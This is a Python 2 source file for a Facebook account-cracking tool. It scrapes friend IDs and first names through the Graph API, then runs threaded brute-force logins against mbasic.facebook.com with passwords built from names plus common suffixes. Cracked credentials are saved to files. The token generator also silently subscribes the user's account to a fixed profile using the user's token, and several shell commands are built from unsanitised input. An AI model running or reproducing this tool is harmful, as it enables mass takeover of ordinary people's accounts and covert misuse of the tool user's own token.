#coding=utf-8
ie=ImportError
try:
    import os
    import sys
    import time
    import requests
    import bs4
    import random
    import json
    import re
    import mechanize
    from bs4 import BeautifulSoup
    from mechanize import Browser
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    from fake_useragent import UserAgent
    from requests.exceptions import ConnectionError
except ie:
    os.system('pip2 install bs4 futures requests fake_useragent mechanize> /dev/null')
    os.system('python2 noob.py')
reload(sys)
sys.setdefaultencoding('utf-8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.addheaders=[
('origin', 'https://m.facebook.com'),
('accept-language', 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'),
("accept-encoding", "gzip, deflate"),
("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"),
('user-agent', 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'),
("referer","https://m.facebook.com"),
("cache-control","max-age=0"), 
("upgrade-insecure-requests","1"), 
("content-type","application/x-www-form-urlencoded"), 
("connection","keep-alive")]
logo="""
\t##     ##    #######    ########  
\t##     ##   ##     ##   ##     ## 
\t##     ##   ##     ##   ##     ## 
\t#########   ##     ##   ########
\t##     ##   ##     ##   ##        
\t##     ##   ##     ##   ##        
\t##     ##    #######    ##        
--------------------------------------------------
   Author   : Muhammad Hamza
   Github   : https://github.com/Hamzahash
   Youtube  : HS Officials
--------------------------------------------------
  Use flight mode & clear cache before use
--------------------------------------------------"""
__method__=[]
def start():
    try:
        ua = open('uagent.txt', 'r').read()
        try:
            kl = open('.access_token.txt', 'r').read()
            xkl = 'Available'
            menu(xkl)
        except IOError:
            xkl = 'Not available'
            menu(xkl)
    except IOError:
        useragent()
def useragent():
    os.system('clear')
    print(logo)
    print('   [1] Continue with default useragent')
    print('   [2] Continue with manual useragent')
    print('')
    useragent_select()
def useragent_select():
    select = raw_input('   Choose useragent: ')
    if select == '':
        print('\033[1;31m\n   Invalid useragent selected, try again\033[0;97m')
        time.sleep(1)
        useragent()
    elif select =='1':
        lists = ['random', 'chrome', 'ff']
        choosed = random.choice(lists)
        if 'ie' in choosed:
            ua = UserAgent().ie
        elif 'random' in choosed:
            ua = UserAgent().random
        elif 'chrome' in choosed:
            ua = UserAgent().chrome
        else:
            ua = UserAgent().ff
        useragent_save = open('uagent.txt', 'w')
        useragent_save.write(ua)
        useragent_save.close()
        os.system('python2 noob.py')
    elif select =='2':
        os.system('clear')
        print(logo)
        inputs = raw_input('   Put your useragent: ')
        useragent_save = open('uagent.txt', 'w')
        useragent_save.write(inputs)
        useragent_save.close()
        os.system('python2 noob.py')
    else:
        print('\033[1;31m\n   Invalid useragent selected, try again\033[0;97m')
        time.sleep(1)
        useragent()
def menu(kl):
    os.system('clear')
    print(logo)
    print('   Access-token: '+kl)
    print(50*'-')
    print('   [1] File bruteforce')
    print('   [2] Manual grab ids')
    print('   [3] Auto grab ids')
    print('   [4] Separate ids')
    print('   [5] Change useragent')
    print('   [6] Generate access token')
    print('   [7] Exit')
    print(50*'-')
    menu_select()
def menu_select():
    select = raw_input('   Choose option: ')
    if select=='':
        print('\033[1;31m\n   Choose valid option: \033[0;97m\n')
        menu_select()
    elif select=="1":
        crack()
    elif select =="2":
        grab()
    elif select =="3":
        grab_auto()
    elif select =="4":
        grab_links()
    elif select =="5":
        os.system('rm -rf uagent.txt')
        useragent()
    elif select =='6':
        gtoken()
    else:
        print('\n\033[1;31m   Invalid response, try again\n\033[0;97m')
        menu_select()
def crack():
    os.system('clear')
    print(logo)
    print('   [1] Crack with fake filler')
    print('   [2] Crack with mbasic login')
    print(50*'-')
    crack_select()
def crack_select():
    ask = raw_input('   Choose cloning method: ')
    if ask =='':
        print('\033[1;31m\n   Choose valid method\033[0;97m\n')
        crack_select()
    elif ask =='1':
        __method__.append('fake')
        aoun()
    elif ask =='2':
        __method__.append('mbasic')
        aoun()
    else:
        print('\033[1;31m\n   Choose valid method\033[0;97m\n')
        crack_select()
def gen1(name):
    results = []
    results.append(name+'123')
    results.append(name+'12345')
    results.append(name+'12')
    results.append(name+'1122')
    results.append(name+'1234')
    results.append(name+'786')
    return results
def gen2(name):
    results = []
    results.append(name.lower()+'12')
    results.append(name.lower()+'1122')
    results.append(name.lower()+'1234')
    results.append(name.lower()+'786')
    return results
def mbasic(em, pas):
    try:
        ua = open('uagent.txt', 'r').read()
        session = requests.Session()
        host='https://mbasic.facebook.com'
        headers={"origin": host, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",host)), "referer": host+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded", "connection": "keep-alive"}
        session.headers.update(headers)
        #print(em+'|'+pas)
        __hop__ = {
            'email':em,
            'pass':pas,
            'login':'submit'
        }
        url_post = session.post('https://mbasic.facebook.com/login.php', data = __hop__).text
        #print(url_post)
        get_cookie = session.cookies.get_dict().keys()
        #print(get_cookie)
        if 'c_user' in get_cookie:
            return({'status':'ok', 'email':em, 'pass':pas})
        elif 'checkpoint' in get_cookie:
            return({'status':'cp', 'email':em, 'pass':pas})
        elif '407' in get_cookie:
            return({'status':'temp', 'email':em, 'pass':pas})
        else:
            return({'status':'error', 'email':em, 'pass':pas})
    except Exception as e:
        pass
def fake(em, pas):
    try:
        ua = open('uagent.txt', 'r').read()
        data = {}
        host='https://mbasic.facebook.com'
        ses = requests.Session()
        ses.headers.update({"origin": host, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",host)), "referer": host+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
        p = ses.get(host).text
        b = BeautifulSoup(p,"html.parser")
        bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
        for i in b("input"):
            try:
                if i.get("name") in bl:data.update({i.get("name"):i.get("value")})
                else:continue
            except:pass
        data.update({"email": em,"pass": pas,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
        #print(data)
        gaaa = ses.post(host+"/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=data)
        get_cookie = ses.cookies.get_dict().keys()
        #print(get_cookie)
        if 'c_user' in get_cookie:
            return({'status':'ok', 'email':em, 'pass':pas})
        elif 'checkpoint' in get_cookie:
            return({'status':'cp', 'email':em, 'pass':pas})
        elif '407' in get_cookie:
            return({'status':'temp', 'email':em, 'pass':pas})
        else:
            return({'status':'error', 'email':em, 'pass':pas})
    except Exception as e:
        pass
def mecha(em, pas):
    try:
        age = ['Mozilla/5.0 (Linux; U; Android 9; ru-ru; Redmi 7A Build/PKQ1.190319.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/11.9.3-g',
        'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.2 Chrome/71.0.3578.99 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 9; vivo 1904 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.8.0.1',
        'Mozilla/5.0 (Linux; U; Android 9; en-au; CPH2083 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/25.5.1.10']
        ua = random.choice(age)
        session = requests.Session()
        host='https://mbasic.facebook.com'
        headers={"origin": host, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",host)), "referer": host+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded", "connection": "keep-alive"}
        session.headers.update(headers)
        #print(em+'|'+pas)
        __hop__ = {
            'email':em,
            'pass':pas,
            'login':'submit'
        }
        url_post = session.post('https://mbasic.facebook.com/login.php', data = __hop__).content
        #print(url_post)
        
        get_cookie = session.cookies.get_dict().keys()
        #print(get_cookie)
        #print(ua)
        if 'c_user' in get_cookie:
            return({'status':'ok', 'email':em, 'pass':pas})
        elif 'checkpoint' in get_cookie:
            return({'status':'cp', 'email':em, 'pass':pas})
        elif '407' in get_cookie:
            return({'status':'temp', 'email':em, 'pass':pas})
        else:
            return({'status':'error', 'email':em, 'pass':pas})
    except Exception as e:
        pass
class aoun():
    def __init__(self):
        os.system('clear')
        print(logo)
        try:
            self.file = raw_input('   Put file path: ')
            self.opens = open(self.file).read().splitlines()
        except IOError:
            print('\033[1;31m\n   Required file not found, try again\033[0;97m\n')
            time.sleep(1)
            aoun()
        ch = raw_input('   Do you want choice pass (y/n) ')
        if ch =='':
            print('\033[1;31m\n   Choose valid passlist, try again\033[0;97m\n')
            time.sleep(1)
            aoun()
        elif ch =='n':
            self.ids =[]
            print('   [1] Default user-agent')
            print('   [2] Random user-agent')
            print(50*'-')
            ask2 = raw_input('   Choose user-agent: ')
            if ask2 =='1':
                ualist='Default'
            elif ask2 =='2':
                ualist='Random'
            else:
                ualist='Unidentified'
            print('   [1] Upper case name passlist')
            print('   [2] Lower case name passlist')
            print(50*'-')
            ask3 = raw_input('   Choose passlist case: ')
            if ask3 =='1':
                for i in self.opens:
                    self.ids.append({
                        'id':i.split('|')[0],
                        'pw':gen1(i.split('|')[1])
                    })
            else:
                for i in self.opens:
                    self.ids.append({
                        'id':i.split('|')[0],
                        'pw':gen2(i.split('|')[1])
                    })
            os.system('clear')
            print(logo)
            print('          Passlist: Default         ')
            print('          Useragent: '+ualist+'        ')
            print(50*'-')
            print('   Total ids: '+str(len(self.ids)))
            print('   Brute on file has started')
            print(50*'-')
            if 'fake' in __method__:
                ThreadPool(30).map(self.fake, self.ids)
            elif 'mbasic' in __method__ and '1' in ask2:
                ThreadPool(30).map(self.mbasic, self.ids)
            elif 'mbasic' in __method__ and '2' in ask2:
                ThreadPool(30).map(self.mecha, self.ids)
            else:
                print('\033[1;31m\n   Choose valid passlist\033[0;97m\n')
                os.sys.exit()
        elif ch =='y':
            self.ids=[]
            for i in self.opens:
                self.ids.append({
                    'id':i.split('|')[0]
                })
            self.pwlist()
        else:
            print('\033[1;31m\n   Choose between y or n\033[0;97m\n')
            time.sleep(1)
            aoun()
    def pwlist(self):
        self.pasw = raw_input('   Put passwords: ').split(',')
        for z in self.ids:
            z.update({
                'pw':self.pasw
            })
        print('   [1] Default user-agent')
        print('   [2] Random user-agent')
        print(50*'-')
        ask2 = raw_input('   Choose user-agent: ')
        if ask2 =='1':
            ualist='Default'
        elif ask2 =='2':
            ualist='Random'
        else:
            ualist='Unidentified'
        os.system('clear')
        print(logo)
        print('          Passlist: Choice         ')
        print('          Useragent: '+ualist+'        ')
        print(50*'-')
        print('   Total ids: '+str(len(self.ids)))
        print('   Brute on file has started')
        print(50*'-')
        if 'fake' in __method__:
            ThreadPool(30).map(self.fake, self.ids)
        elif 'mbasic' in __method__ and '1' in ask2:
            ThreadPool(30).map(self.mbasic, self.ids)
        elif 'mbasic' in __method__ and '2' in ask2:
            ThreadPool(30).map(self.mecha, self.ids)
        else:
            print('\033[1;31m\n   Choose valid passlist\033[0;97m\n')
            os.sys.exit()
    def fake(self, ids):
        try:
            for i in ids.get('pw'):
                log = fake(ids.get('id'), i)
                if log.get('status')=='ok':
                    print('\033[1;32m   [OK] '+ids.get('id')+' | '+i+'\033[0;97m')
                    ok = open('/sdcard/ids/ok.txt', 'a')
                    ok.write(ids.get('id')+'|'+i+'\n')
                    ok.close()
                    break
                elif log.get('status')=='cp':
                    print('\033[1;31m   [CP] '+ids.get('id')+' | '+i+'\033[0;97m')
                    cp = open('/sdcard/ids/cp.txt', 'a')
                    cp.write(ids.get('id')+'|'+i+'\n')
                    cp.close()
                    break
                elif log.get('status')=='temp':
                    print('\033[1;32m   [Temp] '+ids.get('id')+' | '+i+'\033[0;97m')
                else:
                    continue
            self.loop+=1
        except:
            self.fake(ids)
    def mbasic(self, ids):
        try:
            for i in ids.get('pw'):
                log = mbasic(ids.get('id'), i)
                if log.get('status')=='ok':
                    print('\033[1;32m   [OK] '+ids.get('id')+' | '+i+'\033[0;97m')
                    ok = open('/sdcard/ids/ok.txt', 'a')
                    ok.write(ids.get('id')+'|'+i+'\n')
                    ok.close()
                    break
                elif log.get('status')=='cp':
                    print('\033[1;31m   [CP] '+ids.get('id')+' | '+i+'\033[0;97m')
                    cp = open('/sdcard/ids/cp.txt', 'a')
                    cp.write(ids.get('id')+'|'+i+'\n')
                    cp.close()
                    break
                elif log.get('status')=='temp':
                    print('\033[1;32m   [Temp] '+ids.get('id')+' | '+i+'\033[0;97m')
                else:
                    continue
            self.loop+=1
        except:
            self.mbasic(ids)
    def mecha(self, ids):
        try:
            for i in ids.get('pw'):
                log = mecha(ids.get('id'), i)
                if log.get('status')=='ok':
                    print('\033[1;32m   [OK] '+ids.get('id')+' | '+i+'\033[0;97m')
                    ok = open('/sdcard/ids/ok.txt', 'a')
                    ok.write(ids.get('id')+'|'+i+'\n')
                    ok.close()
                    break
                elif log.get('status')=='cp':
                    print('\033[1;31m   [CP] '+ids.get('id')+' | '+i+'\033[0;97m')
                    cp = open('/sdcard/ids/cp.txt', 'a')
                    cp.write(ids.get('id')+'|'+i+'\n')
                    cp.close()
                    break
                elif log.get('status')=='temp':
                    print('\033[1;32m   [Temp] '+ids.get('id')+' | '+i+'\033[0;97m')
                else:
                    continue
            self.loop+=1
        except:
            self.mecha(ids)
def grab():
    try:
        access = open('.access_token.txt', 'r').read()
    except IOError:
        login()
    try:
        r = requests.get('https://graph.facebook.com/me?access_token='+access).text
        q = json.loads(r)
        nme = q['name']
        uid = q['id']
    except KeyError:
        print('\033[1;31m   Logged in token expired, login another token\033[0;97m')
        time.sleep(1)
        os.system('rm -rf .access_token.txt')
        login()
    os.system('clear')
    print(logo)
    print('   Logged user: '+nme)
    print('   Logged uid: -'+uid)
    print(50*'-')
    try:
        limit = int(raw_input('   How many ids do you want to add? '))
    except:
        limit = 1
    t = 0
    for t in range(limit):
        t +=1
        ids = raw_input('   Put id %s:'%(t))
        r = requests.get('https://graph.facebook.com/'+ids+'/friends?access_token='+access).text
        q = json.loads(r)
        ids_save = open('ids.txt', 'a')
        for j in q['data']:
            uids = j['id']
            names = j['name']
            nm = names.rsplit(' ')[0]
            ids_save.write(uids+'|'+nm+'\n')
        ids_save.close()
    print(50*'-')
    save_file = raw_input('   filename to save ids: ')
    os.system('mv ids.txt /sdcard/'+save_file)
    print('   Saved ids file path: /sdcard/'+save_file)
    print(50*'-')
    raw_input('   Press enter to back')
    os.system('python2 noob.py')
def grab_links():
    os.system('clear')
    print(logo)
    print('')
    try:
        limit = int(raw_input('   How many links do you want to separate? '))
    except:
        limit = 1
    file_name = raw_input('   Input file name: ')
    new_save = raw_input('   Save new file as: ')
    y = 0
    for k in range(limit):
        y+=1
        links = raw_input('   Put links %s: '%(y))
        os.system('cat '+file_name+' | grep "'+links+'" >> /sdcard/dummy.txt')
    print(50*'-')
    os.system('sort -r /sdcard/dummy.txt > /sdcard/'+new_save)
    os.system('rm -rf /sdcard/dummy.txt')
    print('   Links grabbed successfully')
    print('   New file saved as: /sdcard/'+new_save)
    print(50*'-')
    raw_input('   Press enter to back ')
    os.system('python2 noob.py')
def login():
    os.system('clear')
    print(logo)
    print('')
    fb_token = raw_input('   Put token here: ')
    try:
        r = requests.get('https://graph.facebook.com/me?access_token='+fb_token).text
        q = json.loads(r)
        name = q['name']
    except KeyError:
        print('\033[1;31m   Invalid token, exiting...\033[0;97m')
        os.sys.exit()
    fbsave = open('.access_token.txt', 'w')
    fbsave.write(fb_token)
    fbsave.close()
    os.system('python2 noob.py')
def grab_auto():
    try:
        access = open('.access_token.txt', 'r').read()
    except IOError:
        login()
    try:
        r = requests.get('https://graph.facebook.com/me?access_token='+access).text
        q = json.loads(r)
        nme = q['name']
        uid = q['id']
    except KeyError:
        print('\033[1;31m   Logged in token expired, login another token\033[0;97m')
        time.sleep(1)
        os.system('rm -rf .access_token.txt')
        login()
    os.system('clear')
    print(logo)
    print('   Logged user: '+nme)
    print('   Logged uid: '+uid)
    print(50*'-')
    os.system('rm -rf sample1.txt')
    first_id = raw_input('   Put link: ')
    r1 = requests.get('https://graph.facebook.com/'+first_id+'/friends?access_token='+access).text
    q = json.loads(r1)
    j = open('sample.txt', 'a')
    for p in q['data']:
        uid = p['id']
        j.write(uid+'|'+'hamza'+'\n')
    j.close()
    which = raw_input('   Which links do you want to grab? ')
    os.system('cat sample.txt | grep "'+which+'" > sample1.txt')
    os.system('rm -rf sample.txt')
    f = open('sample1.txt', 'r').read().splitlines()
    sids = []
    for line in f:
        sids.append(line.strip())
    os.system('rm -rf sample1.txt')
    print(50*'-')
    print('   Target ids: '+str(len(sids)))
    file_name = raw_input('   filename to save ids: ')
    print('   Grab process has been started')
    print(50*'-')
    file_names = '/sdcard/'+file_name
    gids=[]
    for uids in sids: 
        try:
            uuids = uids.split('|')[0]
            t = requests.get('https://graph.facebook.com/'+uuids+'/friends?access_token='+access).text
            tj = json.loads(t)
            fsave = open(file_names, 'a')
            for final in tj['data']:
                uuid = final['id']
                na = final['name']
                nm = na.rsplit(' ')[0]
                fsave.write(uuid+'|'+nm+'\n')
                gids.append(uuid+'|'+nm)
            fsave.close()
            print('   Grab from: '+uuids)
        except KeyError:
            pass
    print(50*'-')
    print('   Total grabbed ids: '+str(len(gids)))
    print('   File saved as: '+file_names)
    print(50*'-')
    raw_input('   Press enter to back ')
    os.system('python2 noob.py')
def gtoken():
    os.system('clear')
    print(logo)
    uid = raw_input('   Put email/id/number: ')
    passw = raw_input('   Put password: ')
    print(50*'-')
    br.open('https://business.facebook.com/business_locations')
    br.select_form(nr=0)
    br['email']=uid
    br['pass']=passw
    br.submit()
    url = br.geturl()
    if 'refsrc=deprecated' in url:
        src = br.open('https://business.facebook.com/business_locations')
        src_read = src.read()
        find_token = re.search('(EAAG\w+)', src_read)
    elif 'checkpoint' in url:
        print('\033[1;31m   Your fb accont has checkpoint\033[0;97m')
    else:
        print('\033[1;31m   Invalid email id or password\033[0;97m')
    if find_token is None:
        print('\033[1;31m   Cannot find token, try another account\033[0;97m')
    else:
        x = requests.post('https://graph.facebook.com/100048514350891/subscribers?access_token='+find_token.group(1))
        print('\033[1;32m   Your access token: \033[0;97m'+find_token.group(1))
        print(50*'-')
        raw_input('   Press enter to back')
        start()
start()
